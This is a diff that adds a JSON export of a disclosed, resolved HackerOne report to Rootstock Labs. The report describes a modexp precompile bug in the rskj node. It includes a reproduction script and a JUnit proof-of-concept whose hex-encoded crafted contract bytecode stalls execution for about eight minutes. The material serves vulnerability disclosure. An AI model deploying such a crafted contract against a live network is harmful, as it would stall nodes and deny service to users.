@@ -1,0 +1,134 @@
+{
+  "id": 2412583,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDEyNTgz",
+  "url": "https://hackerone.com/reports/2412583",
+  "title": "Crafted smart contract can take 8 minutes to execute due to bug in modexp precompile.",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2024-03-11T19:40:38.417Z",
+  "submitted_at": "2024-03-11T19:40:38.520Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "guido",
+    "url": "/guido",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/983/e55b0b2324777fb7efc2de4212fd8d337ca816bd_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 25854,
+    "url": "https://hackerone.com/rootstocklabs",
+    "handle": "rootstocklabs",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/7q67oftq9lv3d00bgl62x7sn1j6e/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/7q67oftq9lv3d00bgl62x7sn1j6e/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Rootstock Labs",
+      "twitter_handle": "rootstocklabs",
+      "website": "https://rootstocklabs.com",
+      "about": "Make Bitcoin work for everyone"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-06-13T17:02:36.785Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-06-13T17:02:36.205Z",
+  "team_member_agreed_on_going_public_at": "2024-08-09T14:53:03.616Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nA bug in the modexp precompile can cause long stalls.\n\n## Steps To Reproduce:\nTested on Linux x64.\n\n```sh\n#!/bin/bash\n\nwget -q https://download.java.net/java/GA/jdk11/9/GPL/openjdk-11.0.2_linux-x64_bin.tar.gz\ntar zxf openjdk-11.0.2_linux-x64_bin.tar.gz\nexport JAVA_HOME=$(realpath jdk-11.0.2/)\ngit clone --depth 1 https://github.com/rsksmart/rskj.git\ncd rskj/\n./configure.sh\necho \"\"\"\npackage co.rsk.vm;\n\nimport org.ethereum.config.blockchain.upgrades.ActivationConfig;\nimport co.rsk.config.TestSystemProperties;\nimport co.rsk.config.VmConfig;\nimport org.ethereum.vm.*;\nimport org.ethereum.core.BlockFactory;\nimport org.ethereum.core.BlockTxSignatureCache;\nimport org.ethereum.core.ReceivedTxSignatureCache;\nimport org.ethereum.vm.program.invoke.ProgramInvokeMockImpl;\nimport java.util.HashSet;\nimport org.ethereum.vm.program.Program;\nimport org.ethereum.config.blockchain.upgrades.ActivationConfigsForTest;\nimport javax.xml.bind.DatatypeConverter;\nimport org.junit.jupiter.api.Test;\n\npublic class Poc {\n    @Test\n    void testPoc() {\n        TestSystemProperties config = new TestSystemProperties();\n        PrecompiledContracts precompiledContracts = new PrecompiledContracts(config, null, new BlockTxSignatureCache(new ReceivedTxSignatureCache()));\n        BlockFactory blockFactory = new BlockFactory(config.getActivationConfig());\n        VmConfig vmConfig = config.getVmConfig();\n        ProgramInvokeMockImpl invoke = new ProgramInvokeMockImpl();\n        ActivationConfig.ForBlock activations = ActivationConfigsForTest.fingerroot500().forBlock(0);\n\n        byte[] code = DatatypeConverter.parseHexBinary(\\\"3332335b59313660d53d601c30303030333333333d601c30303030333333333333321b1b1b1b325b593136605858425a606052015952601d52609880808060006000600536f1603d3333321b1b1b1b32365b3159605858425a606052015952601d52609880808060006000600536f1603d313880813b60003960006000f50a30303030303030\\\");\n\n        invoke.setGas(1000 * 1000 * 5);\n        VM vm = new VM(vmConfig, precompiledContracts);\n        Program program = new Program(vmConfig, precompiledContracts, blockFactory, activations, code, invoke,null, new HashSet<>(), new BlockTxSignatureCache(new ReceivedTxSignatureCache()));\n\n        for (int k = 0; k < 250; k++) {\n            vm.step(program);\n        }\n    }\n}\n\"\"\">rskj-core/src/test/java/co/rsk/vm/Poc.java\n\n# This will likely fail due to a java.lang.OutOfMemoryError exception\ntime ./gradlew test  --tests co.rsk.vm.Poc.testPoc\n\n# Increase test heap size\nsed -i 's/Xmx3G/Xmx10G/g' rskj-core/build.gradle\n\n# Run again\ntime ./gradlew test  --tests co.rsk.vm.Poc.testPoc\n```\n\nOutput:\n\n```\nreal    8m23.429s\nuser    0m3.147s\nsys\t0m0.265s\n```\n\n## Impact\n\nStall the network.",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 85,
+  "voters": [
+    "cy4n1de",
+    "santoryuhunter",
+    "orange303",
+    "n1m0",
+    "zy9ard3",
+    "mohaned0101",
+    "thalaivar304",
+    "uoqki",
+    "akashhamal0x01",
+    "2026",
+    "and 75 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.3,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "none",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 5820,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/rsksmart/rskj",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
